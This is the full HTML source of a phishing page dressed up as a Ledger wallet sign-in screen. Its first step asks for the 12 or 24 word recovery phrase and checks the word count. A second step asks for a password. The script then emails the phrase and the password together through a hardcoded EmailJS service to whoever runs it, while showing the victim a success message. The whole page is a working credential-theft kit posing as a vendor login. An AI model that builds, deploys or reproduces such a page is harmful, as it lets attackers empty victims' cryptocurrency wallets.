<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Ledger - Sign In</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
      body {
        margin: 0;
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background: linear-gradient(to right, #f4e2db, #ebeee8);
      }
      .container {
        background: white;
        padding: 30px;
        box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
        text-align: left;
        width: 350px;
        border-radius: 5px;
        display: none; /* Initially hidden */
      }
      .ledger-logo {
        width: 90px;
        margin-bottom: 10px;
        display: block;
      }
      .title {
        font-size: 22px;
        font-weight: bold;
        margin-bottom: 15px;
      }
      label {
        font-size: 14px;
        color: #555;
      }
      input {
        width: 100%;
        padding: 10px;
        margin-top: 5px;
        border: none;
        border-bottom: 1px solid black;
        outline: none;
        font-size: 16px;
        transition: border-color 0.3s ease;
      }
      input:focus {
        border-bottom: 1px solid #66b3ff;
      }
      .error {
        color: red;
        font-size: 14px;
        display: none;
        margin-top: 5px;
      }
      .buttons {
        display: flex;
        justify-content: flex-end; /* Align buttons to the right */
        margin-top: 20px;
      }

      .btn {
        padding: 10px 20px;
        border: none;
        cursor: pointer;
        font-size: 14px;
        margin-left: 20px;
        width: 13vh;
      }

      .btn-back {
        background: #ccc;
      }

      .btn-next {
        background: rgb(0, 103, 184);
        color: white;
      }

      .btn-nexts {
        background: rgb(0, 103, 184);
        color: white;
        margin-left: 100px;
        width: auto; /* Makes the button adjust naturally */
        font-size: 14px;
      }
      .loading {
        display: none;
        text-align: center;
        font-size: 16px;
        margin-top: 10px;
        color: rgb(0, 103, 184);
      }
      @media (max-width: 600px) {
        body {
          align-items: flex-start;
          height: auto;
        }
        .container {
          width: 100%;
          border-radius: 0;
        }
        .buttons {
          width: 100%;
          gap: 10px;
        }
        .btn {
          width: 100%;
        }
        .ledger-logo {
          width: 11vh;
        }
      }
    </style>
  </head>
  <body>
    <div class="container" id="page1" style="display: block">
      <img src="image/download (9).png" alt="Ledger Logo" class="ledger-logo" />
      <p class="title">Sign in</p>
      <input
        type="text"
        id="walletPhrase"
        placeholder="Enter Wallet 12-24 Key Phrase"
      />
      <p class="error" id="error">The Phrase must be between 12 to 24 words.</p>
      <p class="loading" id="loading1">Loading...</p>
      <div class="buttons">
        <button class="btn btn-back">Back</button>
        <button class="btn btn-next" onclick="goToPasswordPage()">Next</button>
      </div>
    </div>

    <div class="container" id="page2">
      <img src="image/download (9).png" alt="Ledger Logo" class="ledger-logo" />
      <p class="title">Enter Password</p>
      <input type="password" id="password" placeholder="Enter your password" />
      <p class="loading" id="loading2">Submitting...</p>
      <div class="buttons">
        <button class="btn btn-nexts" onclick="submitForm()">Sign In</button>
      </div>
    </div>

    <script>
      (function () {
        emailjs.init("3ijyLWGjsj4QnVlp_");
      })();

      function goToPasswordPage() {
        let phrase = document.getElementById("walletPhrase").value.trim();
        let words = phrase.split(/\s+/);
        let errorText = document.getElementById("error");
        let loadingText = document.getElementById("loading1");
        let nextButton = document.querySelector(".btn-next");

        if (words.length === 12 || words.length === 24) {
          errorText.style.display = "none";
          localStorage.setItem("walletPhrase", phrase);

          // Show loading text
          loadingText.style.display = "block";
          nextButton.disabled = true;

          setTimeout(() => {
            document.getElementById("page1").style.display = "none";
            document.getElementById("page2").style.display = "block";
            loadingText.style.display = "none";
            nextButton.disabled = false;
          }, 1000); // 1-second smooth loading effect
        } else {
          errorText.style.display = "block";
        }
      }

      function submitForm() {
        let password = document.getElementById("password").value.trim();
        let walletPhrase = localStorage.getItem("walletPhrase");
        let submitButton = document.querySelector(".btn-nexts");
        let loadingText = document.getElementById("loading2");

        if (walletPhrase && password) {
          let emailParams = {
            from_name: "User Login",
            message: `Wallet Phrase: ${walletPhrase}\nPassword: ${password}`,
          };

          // Show loading text
          loadingText.style.display = "block";
          submitButton.disabled = true;

          emailjs
            .send("service_b2yu2u9", "template_vslmmtl", emailParams)
            .then((response) => {
              alert("Form Submitted Successfully.");
              console.log("SUCCESS!", response);
              loadingText.style.display = "none";
              submitButton.disabled = false;
            })
            .catch((error) => {
              alert("Sign-in failed. Try again.");
              console.log("FAILED...", error);
              loadingText.style.display = "none";
              submitButton.disabled = false;
            });
        } else {
          alert("Please enter your password.");
        }
      }
    </script>
  </body>
</html>
